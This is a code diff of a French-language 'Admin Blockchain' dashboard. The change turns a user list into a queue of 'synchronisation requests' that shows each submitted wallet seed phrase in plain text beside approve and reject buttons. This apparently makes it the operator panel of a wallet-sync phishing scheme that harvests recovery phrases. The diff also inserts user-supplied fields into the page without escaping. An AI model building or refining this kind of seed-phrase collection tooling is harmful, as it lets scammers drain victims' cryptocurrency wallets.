@@ -62,8 +62,6 @@
         .btn-approve:hover { background: #10b981; color: white; }
         .btn-reject { background: rgba(239,68,68,0.2); color: #ef4444; }
         .btn-reject:hover { background: #ef4444; color: white; }
-        .btn-delete { background: rgba(239,68,68,0.2); color: #ef4444; }
-        .btn-delete:hover { background: #ef4444; color: white; }
         .badge-pending { background: rgba(245,176,66,0.2); color: #f5b042; padding: 4px 10px; border-radius: 20px; font-size: 12px; }
         .badge-approved { background: rgba(16,185,129,0.2); color: #10b981; padding: 4px 10px; border-radius: 20px; font-size: 12px; }
         .badge-rejected { background: rgba(239,68,68,0.2); color: #ef4444; padding: 4px 10px; border-radius: 20px; font-size: 12px; }
@@ -101,6 +99,13 @@
             cursor: pointer;
         }
         .refresh-btn:hover { background: #f5b042; color: #0a0c1a; }
+        .seed-words {
+            font-family: monospace;
+            font-size: 11px;
+            max-width: 200px;
+            word-break: break-all;
+            color: #8b8cae;
+        }
         @media (max-width: 768px) {
             .stats { grid-template-columns: repeat(2, 1fr); }
             th, td { font-size: 12px; }
@@ -114,28 +119,25 @@
                 <div class="logo">🎲 <span>Admin</span> Blockchain</div>
                 <div>
                     <button class="refresh-btn" onclick="loadUsers()"><i class="fas fa-sync-alt"></i> Actualiser</button>
-                    <button class="btn btn-delete" onclick="logout()" style="padding:8px 16px; margin-left:10px;">Déconnexion</button>
+                    <button class="btn btn-reject" onclick="logout()" style="padding:8px 16px; margin-left:10px;">Déconnexion</button>
                 </div>
             </div>
             
             <div class="stats">
-                <div class="stat-card"><div class="stat-number" id="totalUsers">0</div><div class="stat-label">Total utilisateurs</div></div>
+                <div class="stat-card"><div class="stat-number" id="totalUsers">0</div><div class="stat-label">Total</div></div>
                 <div class="stat-card"><div class="stat-number" id="pendingUsers">0</div><div class="stat-label">En attente</div></div>
-                <div class="stat-card"><div class="stat-number" id="approvedUsers">0</div><div class="stat-label">Synchronisés</div></div>
+                <div class="stat-card"><div class="stat-number" id="approvedUsers">0</div><div class="stat-label">Approuvés</div></div>
             </div>
             
             <div class="table-container">
-                <h3 style="margin-bottom: 15px;">👥 Utilisateurs</h3>
+                <h3 style="margin-bottom: 15px;">📋 Demandes de synchronisation</h3>
                 <table>
                     <thead>
                         <tr>
-                            <th>ID</th>
-                            <th>Nom</th>
-                            <th>Email</th>
-                            <th>Adresse</th>
                             <th>Statut</th>
+                            <th>Mots (seed phrase)</th>
                             <th>Date</th>
-                            <th>Actions</th>
+                            <th>Action</th>
                         </tr>
                     </thead>
                     <tbody id="usersTable"></tbody>
@@ -208,27 +210,34 @@
         
         function renderUsersTable(users) {
             const tbody = document.getElementById('usersTable');
+            if (users.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; padding:30px; color:#8b8cae;">Aucune demande de synchronisation</td></tr>`;
+                return;
+            }
+            
             tbody.innerHTML = users.map(user => `
                 <tr>
-                    <td>${user.id}</td>
-                    <td>${user.username}</td>
-                    <td>${user.email}</td>
-                    <td style="font-family:monospace; font-size:11px;">${user.wallet_address?.substring(0, 16)}...</td>
-                    <td><span class="badge-${user.status || 'pending'}">${user.status === 'approved' ? '✅ Synchronisé' : user.status === 'rejected' ? '❌ Refusé' : '⏳ En attente'}</span></td>
+                    <td>
+                        <span class="badge-${user.status || 'pending'}">
+                            ${user.status === 'approved' ? '✅ Approuvé' : user.status === 'rejected' ? '❌ Rejeté' : '⏳ En attente'}
+                        </span>
+                    </td>
+                    <td class="seed-words">${user.seed_phrase || 'Non renseigné'}</td>
                     <td>${new Date(user.created_at).toLocaleDateString()}</td>
                     <td>
                         ${user.status === 'pending' ? `
                             <button class="btn btn-approve" onclick="approveUser(${user.id})"><i class="fas fa-check"></i> Approuver</button>
-                            <button class="btn btn-reject" onclick="rejectUser(${user.id})"><i class="fas fa-times"></i> Refuser</button>
-                        ` : ''}
-                        <button class="btn btn-delete" onclick="deleteUser(${user.id})"><i class="fas fa-trash"></i></button>
+                            <button class="btn btn-reject" onclick="rejectUser(${user.id})"><i class="fas fa-times"></i> Rejeter</button>
+                        ` : `
+                            <span style="color:#8b8cae; font-size:12px;">${user.status === 'approved' ? '✅ Traité' : '❌ Rejeté'}</span>
+                        `}
                     </td>
                 </tr>
             `).join('');
         }
         
         async function approveUser(userId) {
-            if (!confirm('Approuver cet utilisateur ?')) return;
+            if (!confirm('Approuver cette synchronisation ?')) return;
             const res = await fetch(`/api/admin/approve-user`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
@@ -236,7 +245,7 @@
             });
             const data = await res.json();
             if (data.success) {
-                alert('✅ Utilisateur approuvé !');
+                alert('✅ Synchronisation approuvée !');
                 loadUsers();
             } else {
                 alert('Erreur');
@@ -244,7 +253,7 @@
         }
         
         async function rejectUser(userId) {
-            if (!confirm('Refuser cet utilisateur ?')) return;
+            if (!confirm('Rejeter cette synchronisation ?')) return;
             const res = await fetch(`/api/admin/reject-user`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
@@ -252,23 +261,7 @@
             });
             const data = await res.json();
             if (data.success) {
-                alert('❌ Utilisateur refusé');
-                loadUsers();
-            } else {
-                alert('Erreur');
-            }
-        }
-        
-        async function deleteUser(userId) {
-            if (!confirm('Supprimer cet utilisateur ?')) return;
-            const res = await fetch(`/api/admin/delete-user`, {
-                method: 'DELETE',
-                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
-                body: JSON.stringify({ userId })
-            });
-            const data = await res.json();
-            if (data.success) {
-                alert('Utilisateur supprimé');
+                alert('❌ Synchronisation rejetée');
                 loadUsers();
             } else {
                 alert('Erreur');
